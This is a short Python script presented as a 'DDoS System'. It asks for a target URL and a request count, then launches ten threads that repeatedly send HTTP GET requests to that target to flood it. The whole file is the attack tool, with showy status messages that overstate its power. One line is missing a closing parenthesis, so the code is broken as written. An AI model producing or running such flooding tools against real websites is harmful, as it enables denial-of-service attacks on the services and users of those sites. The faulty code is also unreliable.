import requests
import time
import threading


def proceed():
    while True:
        decision = input("Wanna Start?(Y/N): ").strip().lower()
        if decision == 'y':
            print("Made By Rahmed")
            print("Welcome To Dos7 System... Wait 2 Seconds")
            time.sleep(2)
            print("DDoS System Starting...")
            time.sleep(1)
            print("Servers Starting..")
            time.sleep(1)

            target_url = input("Target(http/https):")
            print("Wait For Access")

            num_requests = int(input("Attack Number:")
            time.sleep(1)
            print("Enjoy")

            def send_request():
                for _ in range(num_requests):
                    try:
                        response = requests.get(target_url)
                        print(f"Response: {response.status_code}")
                    except Exception as e:
                        print(f"Error: {e}")

            threads = []
            for _ in range(10):  #
                thread = threading.Thread(target=send_request)
                threads.append(thread)
                thread.start()

            for thread in threads:
                thread.join()

            break
        elif decision == 'n':
            print("System Closed")
            break
        else:
            print("Invalid Input Choice Y or N")


proceed()
